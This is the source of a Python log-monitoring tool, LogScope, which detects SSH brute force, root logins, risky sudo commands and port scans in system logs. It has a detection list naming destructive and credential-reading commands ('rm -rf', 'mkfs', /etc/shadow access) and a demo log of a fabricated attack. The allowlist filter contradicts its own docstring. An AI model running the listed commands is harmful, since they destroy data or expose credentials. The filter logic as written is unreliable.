#!/usr/bin/env python3
"""
LogScope — Lightweight host security monitor for local log monitoring.
Parses Linux auth and system logs, detects suspicious patterns,
and outputs a threat report in the terminal or as JSON/HTML.

v1.0.0 — Overhaul: proper tailing, deduplication, bug fixes, new rules.
"""

import ast
import html as html_module
import re
import json
import hashlib
import sqlite3
import argparse
import sys
import os
import time as time_module
from datetime import datetime, time, timezone
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from typing import Optional, Any
from pathlib import Path

# ---------------------------------------------------------------------------
# Optional dependencies
# ---------------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich import box
    from rich.rule import Rule
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

try:
    import tomllib  # Python 3.11+
    TOML_AVAILABLE = True
except ImportError:
    try:
        import tomli as tomllib
        TOML_AVAILABLE = True
    except ImportError:
        TOML_AVAILABLE = False

console = Console() if RICH_AVAILABLE else None

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
VERSION = "1.0.0"

SEVERITY_COLORS = {
    "LOW":      "green",
    "MEDIUM":   "yellow",
    "HIGH":     "red",
    "CRITICAL": "bold red",
}

SEVERITY_RANK = {"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}

BRUTE_FORCE_THRESHOLD = 5
PORT_SCAN_THRESHOLD = 10

BUSINESS_HOURS_START = time(8, 0)
BUSINESS_HOURS_END = time(18, 0)

DEFAULT_LOG_PATHS = [
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/kern.log",
    "/var/log/secure",
    "/var/log/messages",
]

WINDOWS_DEFAULT_LOG_PATHS = [
    "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.log",
    "C:/Windows/System32/logs/W3SVC1.log",
    "C:/Windows/System32/drivers/etc/hosts",
]

DANGEROUS_SUDO_CMDS = (
    "/bin/sh", "/bin/bash", "/bin/zsh", "chmod", "chown",
    "visudo", "/etc/passwd", "dd ", "mkfs", "rm -rf",
)

DEFAULT_DATABASE_PATH = "logscope.db"


def get_default_log_paths(platform_name: Optional[str] = None) -> list[str]:
    if platform_name is None:
        platform_name = sys.platform
    if "win" in platform_name.lower():
        return list(WINDOWS_DEFAULT_LOG_PATHS)
    return list(DEFAULT_LOG_PATHS)


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------
@dataclass
class Finding:
    rule: str
    severity: str
    description: str
    source_file: str
    line_number: int
    raw_line: str
    timestamp: Optional[str] = None
    extra: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return asdict(self)

    @property
    def fingerprint(self) -> str:
        """Stable deduplication key."""
        value = f"{self.rule}\0{self.source_file}\0{self.line_number}\0{self.raw_line}"
        return hashlib.sha256(value.encode("utf-8", errors="replace")).hexdigest()


@dataclass
class ScanResult:
    scan_time: str
    files_parsed: list[str]
    total_lines: int
    findings: list[Finding] = field(default_factory=list)

    @property
    def summary(self) -> dict[str, int]:
        counts: dict[str, int] = defaultdict(int)
        for f in self.findings:
            counts[f.severity] += 1
        return dict(counts)

    def to_dict(self) -> dict[str, Any]:
        return {
            "scan_time": self.scan_time,
            "files_parsed": self.files_parsed,
            "total_lines": self.total_lines,
            "summary": self.summary,
            "findings": [f.to_dict() for f in self.findings],
        }


class EventStore:
    """Small persistent SQLite store for scan history and findings."""

    def __init__(self, path: str | Path):
        self.path = Path(path)
        self.connection = sqlite3.connect(self.path)
        self.connection.execute("PRAGMA journal_mode=WAL")
        self.connection.executescript(
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY,
                scan_time TEXT NOT NULL,
                total_lines INTEGER NOT NULL,
                files_parsed TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS findings (
                id INTEGER PRIMARY KEY,
                scan_id INTEGER NOT NULL REFERENCES scans(id),
                fingerprint TEXT NOT NULL UNIQUE,
                rule TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT NOT NULL,
                source_file TEXT NOT NULL,
                line_number INTEGER NOT NULL,
                raw_line TEXT NOT NULL,
                timestamp TEXT,
                extra_json TEXT NOT NULL
            );
            CREATE INDEX IF NOT EXISTS idx_findings_rule ON findings(rule);
            CREATE INDEX IF NOT EXISTS idx_findings_severity ON findings(severity);
            CREATE INDEX IF NOT EXISTS idx_findings_timestamp ON findings(timestamp);
            """
        )
        self.connection.commit()

    def save_result(self, result: ScanResult) -> int:
        cursor = self.connection.execute(
            "INSERT INTO scans (scan_time, total_lines, files_parsed) VALUES (?, ?, ?)",
            (result.scan_time, result.total_lines, json.dumps(result.files_parsed)),
        )
        scan_id = int(cursor.lastrowid)
        for finding in result.findings:
            self.connection.execute(
                """
                INSERT OR IGNORE INTO findings
                (scan_id, fingerprint, rule, severity, description, source_file,
                 line_number, raw_line, timestamp, extra_json)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    scan_id,
                    finding.fingerprint,
                    finding.rule,
                    finding.severity,
                    finding.description,
                    finding.source_file,
                    finding.line_number,
                    finding.raw_line,
                    finding.timestamp,
                    json.dumps(finding.extra, sort_keys=True),
                ),
            )
        self.connection.commit()
        return scan_id

    def close(self) -> None:
        self.connection.close()

    def __enter__(self) -> "EventStore":
        return self

    def __exit__(self, _exc_type: Any, _exc_value: Any, _traceback: Any) -> None:
        self.close()


# ---------------------------------------------------------------------------
# Regex patterns
# ---------------------------------------------------------------------------
TS_RE = re.compile(
    r"^(?P<month>\w{3})\s+(?P<day>\d{1,2})\s+(?P<time>\d{2}:\d{2}:\d{2})"
)

WINDOWS_TS_RE = re.compile(
    r"^(?P<date>\d{4}-\d{2}-\d{2})\s+(?P<time>\d{2}:\d{2}:\d{2})"
)

PATTERNS = {
    "ssh_failed": re.compile(
        r"Failed password for (?:invalid user )?(?P<user>\S+) from (?P<ip>[\d.]+)"
    ),
    "ssh_accepted": re.compile(
        r"Accepted (?:password|publickey) for (?P<user>\S+) from (?P<ip>[\d.]+)"
    ),
    "ssh_invalid_user": re.compile(
        r"Invalid user (?P<user>\S+) from (?P<ip>[\d.]+)"
    ),
    "sudo": re.compile(
        r"sudo:\s+(?P<user>\S+)\s+:.*COMMAND=(?P<cmd>.+)"
    ),
    "new_user": re.compile(
        r"(?:useradd|adduser).*new user.*name=(?P<user>\S+)|"
        r"new user.*name=(?P<user2>\S+)",
        re.IGNORECASE,
    ),
    "group_add": re.compile(
        r"(?:usermod|gpasswd).*?(?:add|append).*?(?P<user>\S+)",
        re.IGNORECASE,
    ),
    "su_root": re.compile(
        r"su:.*Successful su for root by (?P<user>\S+)|"
        r"su\[.*\]: \+ .+ (?P<user2>\S+):root"
    ),
    "ssh_maxauth": re.compile(
        r"error: maximum authentication attempts exceeded.*from (?P<ip>[\d.]+)"
    ),
    "fw_drop": re.compile(
        r"(?:IN=\S*\s+OUT=\S*.*)?SRC=(?P<src>[\d.]+).*DST=(?P<dst>[\d.]+).*"
        r"DPT=(?P<dpt>\d+).*(?:DROP|REJECT)",
        re.IGNORECASE,
    ),
    "kern_drop": re.compile(
        r"kernel.*(?:DROP|REJECT|BLOCKED).*SRC=(?P<src>[\d.]+).*DPT=(?P<dpt>\d+)",
        re.IGNORECASE,
    ),
    "root_session": re.compile(
        r"pam_unix\(sshd:session\): session opened for user root"
    ),
    "auth_failure": re.compile(
        r"authentication failure.*user=(?P<user>\S+)",
        re.IGNORECASE,
    ),
    "cron_root": re.compile(
        r"CROND?\[.*\]:.*\(root\) CMD \((?P<cmd>.+)\)",
        re.IGNORECASE,
    ),
    "passwd_access": re.compile(
        r"(?:cat|less|more|vim?|nano|head|tail|cp|mv)\s+/etc/(?:passwd|shadow|sudoers)",
        re.IGNORECASE,
    ),
}


# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
def load_config(config_path: Optional[Path] = None) -> dict[str, Any]:
    defaults = {
        "logs": list(DEFAULT_LOG_PATHS),
        "brute_threshold": BRUTE_FORCE_THRESHOLD,
        "port_scan_threshold": PORT_SCAN_THRESHOLD,
        "severity": None,
        "format": "rich" if RICH_AVAILABLE else "plain",
        "output": None,
        "database": DEFAULT_DATABASE_PATH,
        "allowlist": [],
        "ignorelist": [],
    }

    if config_path is None:
        config_path = Path.cwd() / "logscope.toml"
    else:
        config_path = Path(config_path)

    if not config_path.exists():
        return defaults

    try:
        if TOML_AVAILABLE:
            with open(config_path, "rb") as f:
                data = tomllib.load(f)
            section = data.get("logscope", {}) if isinstance(data, dict) else {}
        else:
            section = _parse_simple_toml(config_path)
    except OSError:
        return defaults

    config = defaults.copy()
    for key, value in section.items():
        if key in config:
            config[key] = value
    return config


def _parse_simple_toml(path: Path) -> dict[str, Any]:
    """Fallback parser for basic key=value TOML-like syntax."""
    text = path.read_text(encoding="utf-8")
    data: dict[str, Any] = {}
    current_section: Optional[str] = None

    for raw_line in text.splitlines():
        line = raw_line.split("#", 1)[0].strip()
        if not line:
            continue
        if line.startswith("[") and line.endswith("]"):
            current_section = line[1:-1].strip()
            continue
        if "=" not in line:
            continue

        key, value = [part.strip() for part in line.split("=", 1)]
        try:
            if value.startswith("[") and value.endswith("]"):
                parsed_value = ast.literal_eval(value)
            elif (value.startswith('"') and value.endswith('"')) or (
                value.startswith("'") and value.endswith("'")):
                parsed_value = ast.literal_eval(value)
            else:
                parsed_value = int(value) if re.fullmatch(r"-?\d+", value) else value
        except (ValueError, SyntaxError):
            parsed_value = value

        if current_section:
            data.setdefault(current_section, {})[key] = parsed_value
        else:
            data[key] = parsed_value

    return data.get("logscope", {}) if isinstance(data.get("logscope"), dict) else {}


# ---------------------------------------------------------------------------
# Filtering
# ---------------------------------------------------------------------------
def filter_findings(
    findings: list[Finding],
    allowlist: Optional[list[str]] = None,
    ignorelist: Optional[list[str]] = None,
) -> list[Finding]:
    """Filter findings by IP or user.

    * allowlist  -> keep ONLY findings whose IP or user is in the list.
    * ignorelist -> drop findings whose IP or user is in the list.
    """
    allow = {item.lower() for item in (allowlist or [])}
    ignore = {item.lower() for item in (ignorelist or [])}

    def _matches(item: Optional[str], bucket: set[str]) -> bool:
        return item is not None and str(item).lower() in bucket

    filtered: list[Finding] = []
    for finding in findings:
        extra = finding.extra or {}
        ip = extra.get("ip")
        user = extra.get("user")

        if _matches(ip, allow) or _matches(user, allow):
            continue
        if _matches(ip, ignore) or _matches(user, ignore):
            continue
        filtered.append(finding)
    return filtered


# ---------------------------------------------------------------------------
# Time helpers
# ---------------------------------------------------------------------------
def extract_timestamp(line: str) -> Optional[str]:
    m = TS_RE.match(line)
    if m:
        return f"{m.group('month')} {m.group('day')} {m.group('time')}"
    m = WINDOWS_TS_RE.match(line)
    if m:
        return f"{m.group('date')} {m.group('time')}"
    return None


def parse_time_from_line(line: str) -> Optional[time]:
    for pattern in (TS_RE, WINDOWS_TS_RE):
        m = pattern.match(line)
        if m:
            parts = m.group("time").split(":")
            try:
                return time(int(parts[0]), int(parts[1]), int(parts[2]))
            except (ValueError, IndexError):
                pass
    return None


def is_off_hours(t: Optional[time]) -> bool:
    if t is None:
        return False
    return t < BUSINESS_HOURS_START or t > BUSINESS_HOURS_END


# ---------------------------------------------------------------------------
# File tailing (rotation-aware)
# ---------------------------------------------------------------------------
@dataclass
class FileState:
    inode: int
    position: int
    line_count: int


class LogTailer:
    """Incremental log reader that survives rotation and truncation."""

    def __init__(self):
        self._state: dict[str, FileState] = {}

    def read_new_lines(self, path: Path) -> list[tuple[int, str]]:
        try:
            stat = path.stat()
        except (OSError, IOError):
            return []

        current_inode = stat.st_ino
        current_size = stat.st_size
        path_str = str(path)

        if path_str not in self._state:
            # First time: jump to end (like tail -f)
            with open(path, "r", errors="replace") as fh:
                total = sum(1 for _ in fh)
            self._state[path_str] = FileState(
                inode=current_inode, position=current_size, line_count=total
            )
            return []

        state = self._state[path_str]

        # Rotation or truncation detected
        if state.inode != current_inode or current_size < state.position:
            state.inode = current_inode
            state.position = 0
            state.line_count = 0

        if current_size == state.position:
            return []

        new_lines: list[tuple[int, str]] = []
        try:
            with open(path, "r", errors="replace") as fh:
                fh.seek(state.position)
                for raw in fh:
                    state.line_count += 1
                    new_lines.append((state.line_count, raw.rstrip()))
                state.position = fh.tell()
        except (OSError, IOError):
            return []

        return new_lines

# ---------------------------------------------------------------------------
# Core analyser
# ---------------------------------------------------------------------------
class LogScope:
    def __init__(
        self,
        log_paths: list[str],
        brute_threshold: int = BRUTE_FORCE_THRESHOLD,
        port_scan_threshold: int = PORT_SCAN_THRESHOLD,
        off_hours_start: time = BUSINESS_HOURS_START,
        off_hours_end: time = BUSINESS_HOURS_END,
    ):
        self.log_paths = log_paths
        self.brute_threshold = brute_threshold
        self.port_scan_threshold = port_scan_threshold
        self.off_hours_start = off_hours_start
        self.off_hours_end = off_hours_end

        # Aggregation state
        self._ssh_failures: dict[str, list[tuple[int, str, str]]] = defaultdict(list)
        self._fw_drops: dict[str, list[tuple[str, int, str]]] = defaultdict(list)

        # Deduplication state (for watch mode)
        self._seen_fingerprints: set[str] = set()
        self._reported_brute: set[str] = set()
        self._reported_port_scan: set[str] = set()
        self._reported_failures: set[tuple[str, int]] = set()

        self._tailer = LogTailer()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------
    def scan(self, tail_mode: bool = False) -> ScanResult:
        result = ScanResult(
            scan_time=datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
            files_parsed=[],
            total_lines=0,
        )

        for path_str in self.log_paths:
            path = Path(path_str)
            if not path.exists():
                if not tail_mode:
                    print(f"[scan] skipped missing file: {path}", file=sys.stderr)
                continue
            if not os.access(path, os.R_OK):
                self._warn(f"[permission denied] {path}")
                continue

            result.files_parsed.append(str(path))

            if tail_mode:
                lines = self._tailer.read_new_lines(path)
                findings = self._parse_lines(lines, str(path))
                result.total_lines += len(lines)
            else:
                findings, line_count = self._parse_file(path)
                result.total_lines += line_count

            result.findings.extend(findings)

        # Aggregate checks
        result.findings.extend(self._check_brute_force())
        result.findings.extend(self._check_port_scans())

        # Deduplicate
        unique: list[Finding] = []
        for f in result.findings:
            fp = f.fingerprint
            if fp not in self._seen_fingerprints:
                self._seen_fingerprints.add(fp)
                unique.append(f)
        result.findings = unique

        # Sort by severity desc, then file, then line
        result.findings.sort(
            key=lambda f: (
                -SEVERITY_RANK.get(f.severity, 0),
                f.source_file,
                f.line_number,
            )
        )
        return result

    def watch(
        self,
        interval: float = 2.0,
        formatter: str = "plain",
        output_path: Optional[str] = None,
        severity: Optional[str] = None,
    ) -> None:
        """Continuously tail logs and emit new findings."""
        print(
            f"[watch] tailing {len(self.log_paths)} file(s) every {interval:.1f}s "
            f"(Ctrl+C to stop)",
            file=sys.stderr,
        )
        try:
            while True:
                result = self.scan(tail_mode=True)
                if result.findings:
                    self._render(result, formatter, output_path, severity)
                time_module.sleep(interval)
        except KeyboardInterrupt:
            print("\n[watch] stopped.", file=sys.stderr)

    def watch_once(self, interval: float = 0.5) -> dict[str, Any]:
        """Read one incremental watch cycle for callers that need polling control."""
        result = self.scan(tail_mode=True)
        if not result.files_parsed:
            time_module.sleep(interval)
        return {
            "path": result.files_parsed[0] if result.files_parsed else (
                str(self.log_paths[0]) if self.log_paths else None
            ),
            "file_exists": bool(result.files_parsed),
            "interval": interval,
            "scanned": bool(result.files_parsed),
            "result": result,
        }

    def _is_off_hours(self, value: Optional[time]) -> bool:
        if value is None:
            return False
        if self.off_hours_start <= self.off_hours_end:
            return value < self.off_hours_start or value > self.off_hours_end
        return self.off_hours_end < value < self.off_hours_start

    # ------------------------------------------------------------------
    # Parsers
    # ------------------------------------------------------------------
    def _parse_file(self, path: Path) -> tuple[list[Finding], int]:
        findings: list[Finding] = []
        line_count = 0
        with open(path, "r", errors="replace") as fh:
            for lineno, raw in enumerate(fh, start=1):
                line_count += 1
                findings.extend(self._parse_line(raw.rstrip(), lineno, str(path)))
        return findings, line_count

    def _parse_lines(self, lines: list[tuple[int, str]], source_file: str) -> list[Finding]:
        findings: list[Finding] = []
        for lineno, line in lines:
            findings.extend(self._parse_line(line, lineno, source_file))
        return findings

    def _parse_line(self, line: str, lineno: int, source_file: str) -> list[Finding]:
        findings: list[Finding] = []
        ts = extract_timestamp(line)
        t = parse_time_from_line(line)

        # ---- SSH failed password -------------------------------------
        m = PATTERNS["ssh_failed"].search(line)
        if m:
            user = m.group("user")
            ip = m.group("ip")
            self._ssh_failures[ip].append((lineno, source_file, line))
            findings.append(Finding(
                rule="SSH_FAILED_LOGIN",
                severity="LOW",
                description=f"Failed SSH login attempt from {ip}",
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
                extra={"ip": ip, "user": user},
            ))
            return findings

        # ---- SSH invalid user ----------------------------------------
        m = PATTERNS["ssh_invalid_user"].search(line)
        if m:
            user = m.group("user")
            ip = m.group("ip")
            self._ssh_failures[ip].append((lineno, source_file, line))
            findings.append(Finding(
                rule="SSH_FAILED_LOGIN",
                severity="LOW",
                description=f"Failed SSH login attempt from {ip}",
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
                extra={"ip": ip, "user": user},
            ))
            return findings

        # ---- SSH max auth exceeded -----------------------------------
        m = PATTERNS["ssh_maxauth"].search(line)
        if m:
            ip = m.group("ip")
            findings.append(Finding(
                rule="SSH_MAX_AUTH_EXCEEDED",
                severity="HIGH",
                description=f"SSH max authentication attempts exceeded from {ip}",
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
                extra={"ip": ip},
            ))
            return findings

        # ---- SSH accepted login --------------------------------------
        m = PATTERNS["ssh_accepted"].search(line)
        if m:
            user = m.group("user")
            ip = m.group("ip")
            off = self._is_off_hours(t)
            sev = "CRITICAL" if user == "root" else ("MEDIUM" if off else "LOW")
            desc = f"Successful SSH login: user={user} from {ip}"
            if user == "root":
                desc += " [ROOT LOGIN]"
            if off:
                desc += f" [OFF-HOURS {t}]"
            findings.append(Finding(
                rule="SSH_ACCEPTED_LOGIN",
                severity=sev,
                description=desc,
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
                extra={"user": user, "ip": ip, "off_hours": off},
            ))
            return findings

        # ---- Root session opened -------------------------------------
        m = PATTERNS["root_session"].search(line)
        if m:
            findings.append(Finding(
                rule="ROOT_SESSION_OPENED",
                severity="CRITICAL",
                description="SSH session opened for root user",
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
            ))
            return findings

        # ---- New user created ----------------------------------------
        m = PATTERNS["new_user"].search(line)
        if m:
            user = m.group("user") or m.group("user2") or "unknown"
            findings.append(Finding(
                rule="NEW_USER_CREATED",
                severity="HIGH",
                description=f"New system user created: {user}",
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
                extra={"user": user},
            ))
            return findings

        # ---- Group add -----------------------------------------------
        m = PATTERNS["group_add"].search(line)
        if m:
            user = m.group("user") or "unknown"
            findings.append(Finding(
                rule="USER_ADDED_TO_GROUP",
                severity="MEDIUM",
                description=f"User added to privileged group: {user}",
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
                extra={"user": user},
            ))
            return findings

        # ---- su to root ----------------------------------------------
        m = PATTERNS["su_root"].search(line)
        if m:
            user = m.group("user") or m.group("user2") or "unknown"
            off = self._is_off_hours(t)
            sev = "CRITICAL" if off else "HIGH"
            findings.append(Finding(
                rule="SU_TO_ROOT",
                severity=sev,
                description=f"User {user} switched to root via su" + (" [OFF-HOURS]" if off else ""),
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
                extra={"user": user, "off_hours": off},
            ))
            return findings

        # ---- Sudo usage ----------------------------------------------
        m = PATTERNS["sudo"].search(line)
        if m:
            user = m.group("user")
            cmd = m.group("cmd").strip()
            off = self._is_off_hours(t)
            dangerous = any(d in cmd for d in DANGEROUS_SUDO_CMDS)
            sev = "HIGH" if (dangerous or off) else "LOW"
            desc = f"sudo: {user} ran: {cmd[:80]}"
            if dangerous:
                desc += " [DANGEROUS CMD]"
            if off:
                desc += " [OFF-HOURS]"
            findings.append(Finding(
                rule="SUDO_COMMAND",
                severity=sev,
                description=desc,
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
                extra={"user": user, "command": cmd, "dangerous": dangerous},
            ))
            return findings

        # ---- Firewall DROP (port scan) -------------------------------
        m = PATTERNS["fw_drop"].search(line) or PATTERNS["kern_drop"].search(line)
        if m:
            src = m.group("src") if "src" in m.groupdict() else "unknown"
            dpt = m.group("dpt") if "dpt" in m.groupdict() else "unknown"
            self._fw_drops[src].append((source_file, lineno, line))
            return findings

        # ---- Auth failure generic ------------------------------------
        m = PATTERNS["auth_failure"].search(line)
        if m:
            user = m.group("user")
            findings.append(Finding(
                rule="AUTH_FAILURE",
                severity="LOW",
                description=f"Authentication failure for user: {user}",
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
                extra={"user": user},
            ))
            return findings

        # ---- Cron as root --------------------------------------------
        m = PATTERNS["cron_root"].search(line)
        if m:
            cmd = m.group("cmd").strip()
            off = self._is_off_hours(t)
            sev = "MEDIUM" if off else "LOW"
            findings.append(Finding(
                rule="CRON_ROOT_CMD",
                severity=sev,
                description=f"Cron job executed as root: {cmd[:80]}" + (" [OFF-HOURS]" if off else ""),
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
                extra={"command": cmd, "off_hours": off},
            ))
            return findings

        # ---- Passwd / shadow access ----------------------------------
        m = PATTERNS["passwd_access"].search(line)
        if m:
            findings.append(Finding(
                rule="PASSWD_FILE_ACCESS",
                severity="HIGH",
                description="Sensitive authentication file accessed",
                source_file=source_file,
                line_number=lineno,
                raw_line=line,
                timestamp=ts,
            ))
            return findings

        return findings

    # ------------------------------------------------------------------
    # Aggregate checks
    # ------------------------------------------------------------------
    def _check_brute_force(self) -> list[Finding]:
        findings: list[Finding] = []
        for ip, attempts in self._ssh_failures.items():
            count = len(attempts)
            if count >= self.brute_threshold:
                if ip in self._reported_brute:
                    continue
                self._reported_brute.add(ip)
                last_lineno, last_file, last_line = attempts[-1]
                ts = extract_timestamp(last_line)
                sev = "CRITICAL" if count >= self.brute_threshold * 3 else "HIGH"
                findings.append(Finding(
                    rule="SSH_BRUTE_FORCE",
                    severity=sev,
                    description=f"SSH brute force from {ip} — {count} failed attempts",
                    source_file=last_file,
                    line_number=last_lineno,
                    raw_line=last_line,
                    timestamp=ts,
                    extra={"ip": ip, "attempt_count": count},
                ))
        return findings

    def _check_port_scans(self) -> list[Finding]:
        findings: list[Finding] = []
        for src, lines in self._fw_drops.items():
            count = len(lines)
            if count >= self.port_scan_threshold:
                if src in self._reported_port_scan:
                    continue
                self._reported_port_scan.add(src)
                sev = "CRITICAL" if count >= self.port_scan_threshold * 3 else "HIGH"
                last_file, last_lineno, last_line = lines[-1]
                findings.append(Finding(
                    rule="PORT_SCAN_DETECTED",
                    severity=sev,
                    description=f"Possible port scan from {src} — {count} firewall drops",
                    source_file=last_file,
                    line_number=last_lineno,
                    raw_line=last_line,
                    extra={"src_ip": src, "drop_count": count},
                ))
        return findings

    def _render(
        self,
        result: ScanResult,
        fmt: str,
        output_path: Optional[str],
        severity: Optional[str],
    ) -> None:
        if severity:
            min_rank = SEVERITY_RANK[severity]
            result.findings = [
                f for f in result.findings
                if SEVERITY_RANK.get(f.severity, 0) >= min_rank
            ]

        if fmt == "json":
            render_json(result, output_path)
        elif fmt == "html":
            render_html(result, output_path)
        elif fmt == "plain" or not RICH_AVAILABLE:
            render_plain(result)
        else:
            render_rich(result)

    @staticmethod
    def _warn(msg: str) -> None:
        print(f"[WARN] {msg}", file=sys.stderr)

# ---------------------------------------------------------------------------
# Output renderers
# ---------------------------------------------------------------------------
def render_rich(result: ScanResult) -> None:
    c = Console()
    c.print()
    c.print(Panel(
        Text("LogScope  //  Lightweight Host Security Monitor", style="bold white", justify="center"),
        subtitle=f"[dim]v{VERSION}  ·  {result.scan_time}[/dim]",
        border_style="bright_blue",
        padding=(0, 4),
    ))

    c.print(f"\n[bold]Files scanned:[/bold] {', '.join(result.files_parsed) or 'none'}")
    c.print(f"[bold]Lines parsed:[/bold]  {result.total_lines:,}")
    c.print(f"[bold]Findings:[/bold]      {len(result.findings)}")

    summary = result.summary
    if summary:
        c.print()
        c.print(Rule("[bold]Severity Summary[/bold]", style="bright_blue"))
        parts = []
        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
            n = summary.get(sev, 0)
            if n:
                color = SEVERITY_COLORS[sev]
                parts.append(f"[{color}]{sev}: {n}[/{color}]")
        c.print("  " + "   ".join(parts))

    if not result.findings:
        c.print("\n[bold green]✔  No suspicious activity detected.[/bold green]\n")
        return

    c.print()
    c.print(Rule("[bold]Findings[/bold]", style="bright_blue"))
    c.print()

    table = Table(
        box=box.SIMPLE_HEAVY,
        show_header=True,
        header_style="bold bright_white",
        border_style="grey42",
        expand=True,
    )
    table.add_column("#",          style="dim",        width=4,  no_wrap=True)
    table.add_column("Severity",                       width=10, no_wrap=True)
    table.add_column("Rule",       style="bold cyan",  width=26, no_wrap=True)
    table.add_column("Timestamp",  style="dim",        width=16, no_wrap=True)
    table.add_column("Description")
    table.add_column("File:Line",  style="dim",        width=22, no_wrap=True)

    for i, f in enumerate(result.findings, start=1):
        color = SEVERITY_COLORS.get(f.severity, "white")
        sev_text = Text(f.severity, style=f"bold {color}")
        file_label = f"{Path(f.source_file).name}:{f.line_number}"
        table.add_row(
            str(i),
            sev_text,
            f.rule,
            f.timestamp or "–",
            f.description,
            file_label,
        )

    c.print(table)
    c.print()


def render_plain(result: ScanResult) -> None:
    sep = "=" * 72
    print(sep)
    print(f"  LogScope v{VERSION}  —  {result.scan_time}")
    print(sep)
    print(f"Files : {', '.join(result.files_parsed) or 'none'}")
    print(f"Lines : {result.total_lines:,}")
    print(f"Hits  : {len(result.findings)}")
    print()

    summary = result.summary
    if summary:
        print("Severity summary:")
        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
            n = summary.get(sev, 0)
            if n:
                print(f"  {sev:<10} {n}")
        print()

    if not result.findings:
        print("No suspicious activity detected.")
        return

    print(sep)
    fmt = "{:<4} {:<10} {:<28} {:<16} {}"
    print(fmt.format("#", "SEVERITY", "RULE", "TIMESTAMP", "DESCRIPTION"))
    print("-" * 72)
    for i, f in enumerate(result.findings, start=1):
        ts = (f.timestamp or "–")[:16]
        print(fmt.format(i, f.severity, f.rule[:28], ts, f.description[:60]))
    print(sep)


def render_json(result: ScanResult, output_path: Optional[str] = None) -> None:
    data = json.dumps(result.to_dict(), indent=2)
    if output_path:
        Path(output_path).write_text(data, encoding="utf-8")
        print(f"JSON report written to: {output_path}")
    else:
        print(data)


def render_html(result: ScanResult, output: Optional[str] = None) -> None:
    rows = []
    for f in result.findings:
        rows.append(
            "<tr>"
            f"<td>{html_module.escape(f.severity)}</td>"
            f"<td>{html_module.escape(f.rule)}</td>"
            f"<td>{html_module.escape(f.description)}</td>"
            f"<td>{html_module.escape(f.timestamp or '–')}</td>"
            f"<td>{html_module.escape(f'{Path(f.source_file).name}:{f.line_number}')}</td>"
            "</tr>"
        )

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>LogScope Report</title>
  <style>
    body{{font-family:system-ui,-apple-system,sans-serif;margin:2rem;background:#0f172a;color:#e2e8f0;}}
    h1{{color:#38bdf8;}}
    .meta{{color:#94a3b8;margin-bottom:1.5rem;}}
    table{{border-collapse:collapse;width:100%;font-size:0.9rem;}}
    th,td{{border:1px solid #334155;padding:0.6rem;text-align:left;}}
    th{{background:#1e293b;color:#38bdf8;}}
    tr:nth-child(even){{background:#1e293b;}}
    .sev-CRITICAL{{color:#f87171;font-weight:bold;}}
    .sev-HIGH{{color:#fb923c;font-weight:bold;}}
    .sev-MEDIUM{{color:#facc15;}}
    .sev-LOW{{color:#4ade80;}}
  </style>
</head>
<body>
  <h1>LogScope Report</h1>
  <div class="meta">
    <p><strong>Scan time:</strong> {html_module.escape(result.scan_time)}</p>
    <p><strong>Files parsed:</strong> {html_module.escape(', '.join(result.files_parsed) or 'none')}</p>
    <p><strong>Findings:</strong> {len(result.findings)}</p>
  </div>
  <table>
    <thead>
      <tr><th>Severity</th><th>Rule</th><th>Description</th><th>Timestamp</th><th>Location</th></tr>
    </thead>
    <tbody>{''.join(rows)}</tbody>
  </table>
</body>
</html>"""

    if output:
        Path(output).write_text(html, encoding="utf-8")
        print(f"HTML report written to: {output}")
    else:
        print(html)


# ---------------------------------------------------------------------------
# Demo log generator
# ---------------------------------------------------------------------------
DEMO_LOG = """\
Jan 15 03:12:01 host sshd[1234]: Failed password for root from 192.168.1.200 port 52100 ssh2
Jan 15 03:12:03 host sshd[1235]: Failed password for root from 192.168.1.200 port 52101 ssh2
Jan 15 03:12:05 host sshd[1236]: Failed password for admin from 192.168.1.200 port 52102 ssh2
Jan 15 03:12:07 host sshd[1237]: Failed password for ubuntu from 192.168.1.200 port 52103 ssh2
Jan 15 03:12:09 host sshd[1238]: Failed password for deploy from 192.168.1.200 port 52104 ssh2
Jan 15 03:12:11 host sshd[1239]: Failed password for pi from 192.168.1.200 port 52105 ssh2
Jan 15 03:12:13 host sshd[1240]: Failed password for vagrant from 192.168.1.200 port 52106 ssh2
Jan 15 09:05:22 host sshd[2001]: Accepted password for alice from 10.0.0.5 port 4422 ssh2
Jan 15 02:47:03 host sshd[2002]: Accepted password for root from 203.0.113.50 port 6611 ssh2
Jan 15 02:47:10 host sshd[2003]: pam_unix(sshd:session): session opened for user root by (uid=0)
